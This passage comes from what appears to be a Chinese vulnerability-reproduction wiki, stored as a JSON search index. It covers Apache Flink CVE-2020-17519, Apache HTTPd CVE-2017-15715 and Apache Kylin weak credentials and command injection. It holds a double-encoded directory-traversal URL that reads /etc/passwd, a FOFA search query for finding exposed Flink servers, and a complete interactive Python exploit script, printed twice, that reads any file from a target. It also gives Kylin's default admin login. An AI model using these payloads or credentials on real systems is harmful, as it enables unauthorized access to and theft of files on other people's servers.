CVE-2020-17518,CVE-2020-17519 \uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a \u9ad8\u5371 \uff0c\u6f0f\u6d1e\u8bc4\u5206\uff1a 8.5 \u3002 \u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7 REST API \u76ee\u5f55\u904d\u5386\uff0c\u53ef\u9020\u6210 \u6587\u4ef6\u8bfb\u53d6/\u5199\u5165 \u7684\u5f71\u54cd\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache Flink 1.11.0 Apache Flink 1.11.1 Apache Flink 1.11.2 FOFA \u00b6 [!NOTE] app=\"Apache Flink\" \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519 \u6f0f\u6d1e\u590d\u73b0 \u00b6 POC: http://xxx.xxx.xxx.xxx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Flink 1.11.0-1.11.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-17519.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mFile >>> /etc/passwd \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , file_name ): file_name = file_name . replace ( \"/\" , \" %252f \" ) vuln_url = target_url + \"/jobmanager/logs/.. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. {} \" . format ( file_name ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , timeout = 10 , verify = False , headers = headers ) print ( \" \\033 [32m[o] \u8bf7\u6c42URL \uff1a {} \\033 [0m\" . format ( vuln_url )) if \"root\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u6210\u529f\u8bfb\u53d6 /etc/passwd \uff0c\u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( target_url , response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , file_name ): file_name_re = file_name . replace ( \"/\" , \" %252f \" ) vuln_url = target_url + \"/jobmanager/logs/.. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. {} \" . format ( file_name_re ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , timeout = 10 , verify = False , headers = headers ) print ( \" \\033 [32m[o] \u8bf7\u6c42URL \uff1a {} \\033 [0m\" . format ( vuln_url )) if \"error\" not in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u6210\u529f\u8bfb\u53d6 {} \uff0c\u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( target_url , file_name , response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807\u6587\u4ef6 {} \u8bfb\u53d6\u5931\u8d25 \\033 [0m\" . format ( file_name )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) file_name = \"/etc/passwd\" POC_1 ( target_url , file_name ) while True : file_name = input ( \" \\033 [35mFile >>> \\033 [0m\" ) if file_name == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , file_name )","title":"Apache Flink \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e CVE-2020-17519"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2020-17519/#apache-flink-\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e-cve-2020-17519","text":"","title":"Apache Flink \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e CVE-2020-17519"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2020-17519/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2021\u5e7401\u670806\u65e5\uff0c360CERT\u76d1\u6d4b\u53d1\u73b0 Apache Flink \u53d1\u5e03\u4e86 Apache Flink \u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e,\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e \u7684\u98ce\u9669\u901a\u544a\uff0c\u6f0f\u6d1e\u7f16\u53f7\u4e3a CVE-2020-17518,CVE-2020-17519 \uff0c\u6f0f\u6d1e\u7b49\u7ea7\uff1a \u9ad8\u5371 \uff0c\u6f0f\u6d1e\u8bc4\u5206\uff1a 8.5 \u3002 \u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7 REST API \u76ee\u5f55\u904d\u5386\uff0c\u53ef\u9020\u6210 \u6587\u4ef6\u8bfb\u53d6/\u5199\u5165 \u7684\u5f71\u54cd\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2020-17519/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache Flink 1.11.0 Apache Flink 1.11.1 Apache Flink 1.11.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2020-17519/#fofa","text":"[!NOTE] app=\"Apache Flink\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2020-17519/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2020-17519/#\u6f0f\u6d1e\u590d\u73b0","text":"POC: http://xxx.xxx.xxx.xxx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Flink/Apache%20Flink%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%20CVE-2020-17519/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Flink 1.11.0-1.11.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-17519.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mFile >>> /etc/passwd \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , file_name ): file_name = file_name . replace ( \"/\" , \" %252f \" ) vuln_url = target_url + \"/jobmanager/logs/.. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. {} \" . format ( file_name ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , timeout = 10 , verify = False , headers = headers ) print ( \" \\033 [32m[o] \u8bf7\u6c42URL \uff1a {} \\033 [0m\" . format ( vuln_url )) if \"root\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u6210\u529f\u8bfb\u53d6 /etc/passwd \uff0c\u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( target_url , response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , file_name ): file_name_re = file_name . replace ( \"/\" , \" %252f \" ) vuln_url = target_url + \"/jobmanager/logs/.. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. %252f .. {} \" . format ( file_name_re ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , timeout = 10 , verify = False , headers = headers ) print ( \" \\033 [32m[o] \u8bf7\u6c42URL \uff1a {} \\033 [0m\" . format ( vuln_url )) if \"error\" not in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u6210\u529f\u8bfb\u53d6 {} \uff0c\u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( target_url , file_name , response . text )) else : print ( \" \\033 [31m[x] \u76ee\u6807\u6587\u4ef6 {} \u8bfb\u53d6\u5931\u8d25 \\033 [0m\" . format ( file_name )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) file_name = \"/etc/passwd\" POC_1 ( target_url , file_name ) while True : file_name = input ( \" \\033 [35mFile >>> \\033 [0m\" ) if file_name == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , file_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20HTTPd/Apache%20HTTPd%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%20CVE-2017-15715/","text":"Apache HTTPd \u6362\u884c\u89e3\u6790\u6f0f\u6d1e CVE-2017-15715 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache HTTPD\u662f\u4e00\u6b3eHTTP\u670d\u52a1\u5668\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7mod_php\u6765\u8fd0\u884cPHP\u7f51\u9875\u3002\u51762.4.0~2.4.29\u7248\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u89e3\u6790\u6f0f\u6d1e\uff0c\u5728\u89e3\u6790PHP\u65f6\uff0c 1.php\\x0A \u5c06\u88ab\u6309\u7167PHP\u540e\u7f00\u8fdb\u884c\u89e3\u6790\uff0c\u5bfc\u81f4\u7ed5\u8fc7\u4e00\u4e9b\u670d\u52a1\u5668\u7684\u5b89\u5168\u7b56\u7565\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache HTTPd 2.4.0~2.4.29\u7248\u672c \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080 \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u76f4\u63a5\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\u4f1a\u88ab\u62e6\u622a \u6293\u5305\u4fee\u6539\u5982\u4e0b\u53c2\u6570 \u54cd\u5e94\u4e3a200\uff0c\u6210\u529f\u7ed5\u8fc7 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080/evil.php%0a \u6210\u529f\u89e6\u53d1\u89e3\u6790\u6f0f\u6d1e","title":"pache HTTPd \u6362\u884c\u89e3\u6790\u6f0f\u6d1e CVE-2017-15715"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20HTTPd/Apache%20HTTPd%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%20CVE-2017-15715/#apache-httpd-\u6362\u884c\u89e3\u6790\u6f0f\u6d1e-cve-2017-15715","text":"","title":"Apache HTTPd \u6362\u884c\u89e3\u6790\u6f0f\u6d1e CVE-2017-15715"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20HTTPd/Apache%20HTTPd%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%20CVE-2017-15715/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache HTTPD\u662f\u4e00\u6b3eHTTP\u670d\u52a1\u5668\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7mod_php\u6765\u8fd0\u884cPHP\u7f51\u9875\u3002\u51762.4.0~2.4.29\u7248\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u89e3\u6790\u6f0f\u6d1e\uff0c\u5728\u89e3\u6790PHP\u65f6\uff0c 1.php\\x0A \u5c06\u88ab\u6309\u7167PHP\u540e\u7f00\u8fdb\u884c\u89e3\u6790\uff0c\u5bfc\u81f4\u7ed5\u8fc7\u4e00\u4e9b\u670d\u52a1\u5668\u7684\u5b89\u5168\u7b56\u7565\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20HTTPd/Apache%20HTTPd%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%20CVE-2017-15715/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache HTTPd 2.4.0~2.4.29\u7248\u672c","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20HTTPd/Apache%20HTTPd%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%20CVE-2017-15715/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080 \u6b63\u5e38\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20HTTPd/Apache%20HTTPd%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%20CVE-2017-15715/#\u6f0f\u6d1e\u590d\u73b0","text":"\u76f4\u63a5\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\u4f1a\u88ab\u62e6\u622a \u6293\u5305\u4fee\u6539\u5982\u4e0b\u53c2\u6570 \u54cd\u5e94\u4e3a200\uff0c\u6210\u529f\u7ed5\u8fc7 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080/evil.php%0a \u6210\u529f\u89e6\u53d1\u89e3\u6790\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20Console%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4/","text":"Apache Kylin Console \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache Kylin Console \u63a7\u5236\u53f0\u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4 admin\uff1aKYLIN \uff0c\u53ef\u88ab\u767b\u5f55\u63a7\u5236\u53f0\u8fdb\u4e00\u6b65\u5229\u7528\u5176\u4ed6\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache Kylin \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6253\u5f00\u540e\u76ee\u6807\u7ad9\u70b9\u4f7f\u7528\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801**admin/KYLIN**\u767b\u5f55\uff0c\u51fa\u73b0\u521d\u59cb\u754c\u9762\u5373\u4e3a\u6210\u529f Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Apache_Kylin_Console_Default_password.json","title":"Apache Kylin Console \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20Console%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4/#apache-kylin-console-\u63a7\u5236\u53f0\u5f31\u53e3\u4ee4","text":"","title":"Apache Kylin Console \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20Console%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache Kylin Console \u63a7\u5236\u53f0\u5b58\u5728\u9ed8\u8ba4\u5f31\u53e3\u4ee4 admin\uff1aKYLIN \uff0c\u53ef\u88ab\u767b\u5f55\u63a7\u5236\u53f0\u8fdb\u4e00\u6b65\u5229\u7528\u5176\u4ed6\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20Console%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache Kylin","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20Console%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6253\u5f00\u540e\u76ee\u6807\u7ad9\u70b9\u4f7f\u7528\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801**admin/KYLIN**\u767b\u5f55\uff0c\u51fa\u73b0\u521d\u59cb\u754c\u9762\u5373\u4e3a\u6210\u529f","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20Console%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Apache_Kylin_Console_Default_password.json","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-13925/","text":"Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-13925 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 6\u6708\uff0c\u4eac\u4e1c\u5b89\u5168\u7684\u84dd\u519b\u56e2\u961f\u53d1\u73b0\u4e86\u4e00\u4e2a apache kylin \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u4e25\u91cd\u6f0f\u6d1e\uff08 CVE-2020-13925\uff09\u3002\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u767b\u5f55\u4efb\u4f55\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801\u9ed8\u8ba4\u672a\u4fee\u6539\u7684\u8d26\u53f7\uff0c\u83b7\u5f97\u7ba1\u7406\u5458\u6743\u9650\u3002\u7531\u4e8eApache Kylin\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u4f01\u4e1a\u7684\u5927\u6570\u636e\u5206\u6790\u5e73\u53f0\uff0c\u56e0\u6b64\u8be5\u6f0f\u6d1e\u5c06\u5bf9\u4f01\u4e1a\u6838\u5fc3\u6570\u636e\u5177\u6709\u8f83\u5927\u7684\u5371\u5bb3\uff0c\u5b58\u5728\u6570\u636e\u6cc4\u9732\u98ce\u9669\uff0c\u5efa\u8bae\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u8f6f\u4ef6\u81f3\u5b89\u5168\u7248\u672c\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1,Kylin 3.0.2 \u73af\u5883\u642d\u5efa \u00b6 \u8fd9\u91cc\u4f7f\u7528 docker \u6765\u642d\u5efa\u9700\u8981\u7684\u73af\u5883 Kylin\u5b98\u65b9\u6587\u6863 docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] \u5982\u679c\u670d\u52a1\u5668\u5185\u5b58\u8f83\u5c0f\uff0c\u53ef\u4e0d\u9009\u62e9 -m 8G \u53c2\u6570 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 \u6253\u5f00\u540e\u4f7f\u7528\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801**admin/KYLIN**\u767b\u5f55\uff0c\u51fa\u73b0\u521d\u59cb\u754c\u9762\u5373\u4e3a\u6210\u529f \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u51fa\u73b0\u6f0f\u6d1e\u7684\u4ee3\u7801\u6587\u4ef6\u5728**server-base/src/main/java/org/apache/kylin/rest/controller/DiagnosisController.java** /** * Get diagnosis information for project */ @RequestMapping ( value = \"/project/{project}/download\" , method = { RequestMethod . GET }, produces = { \"application/json\" }) @ResponseBody public void dumpProjectDiagnosisInfo ( @PathVariable String project , final HttpServletRequest request , final HttpServletResponse response ) { try ( AutoDeleteDirectory diagDir = new AutoDeleteDirectory ( \"diag_project\" , \"\" )) { String filePath = dgService . dumpProjectDiagnosisInfo ( project , diagDir . getFile ()); setDownloadResponse ( filePath , response ); } catch ( IOException e ) { throw new InternalErrorException ( \"Failed to dump project diagnosis info. \" + e . getMessage (), e ); } } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230 **{project}**\u53c2\u6570\u662f\u7528\u6237\u53ef\u63a7\u7684\u53d8\u91cf\uff0c\u5411\u4e0b\u8ddf\u8fdb**dumpProjectDiagnosisInfo**\u51fd\u6570 public String dumpProjectDiagnosisInfo ( String project , File exportPath ) throws IOException { aclEvaluate . checkProjectOperationPermission ( project ); String [] args = { project , exportPath . getAbsolutePath () }; runDiagnosisCLI ( args ); return getDiagnosisPackageName ( exportPath ); } \u9996\u5148\u901a\u8fc7**checkProjectOperationPermission**\u51fd\u6570\u6765\u68c0\u67e5\u8be5project\u662f\u5426\u8bb8\u53ef\uff0c\u7136\u540e\u6784\u5efa\u4e00\u4e2aargs\u7684\u5b57\u7b26\u4e32\u6570\u7ec4\uff0c\u770b\u4e00\u4e0b**checkProjectOperationPermission**\u51fd\u6570 public void checkProjectOperationPermission ( String projectName ) { ProjectInstance projectInstance = getProjectInstance ( projectName ); aclUtil . hasProjectOperationPermission ( projectInstance ); } \u8fd9\u91cc\u4f20\u5165projectName\uff0c\u7136\u540e\u901a\u8fc7getProjectInstance\u6765\u83b7\u53d6\u9879\u76ee\u5b9e\u4f8b,\u8ddf\u8fdb**getProjectInstance** private ProjectInstance getProjectInstance ( String projectName ) { return ProjectManager . getInstance ( KylinConfig . getInstanceFromEnv ()). getProject ( projectName ); } \u56e0\u4e3a projectName \u4f1a\u88ab\u6211\u4eec\u66ff\u6362\u6389\uff0c\u6240\u4ee5\u4e0d\u4f1a\u83b7\u5f97\u4e00\u4e2a\u6b63\u786e\u7684projectName,\u5219\u4f1a\u8fd4\u56de\u4e00\u4e2aNull\uff0c\u67e5\u770b\u4e0b**hasProjectOperationPermission\u51fd\u6570** @PreAuthorize ( Constant . ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#project, 'ADMINISTRATION')\" + \" or hasPermission(#project, 'MANAGEMENT')\" + \" or hasPermission(#project, 'OPERATION')\" ) public boolean hasProjectOperationPermission ( ProjectInstance project ) { return true ; } 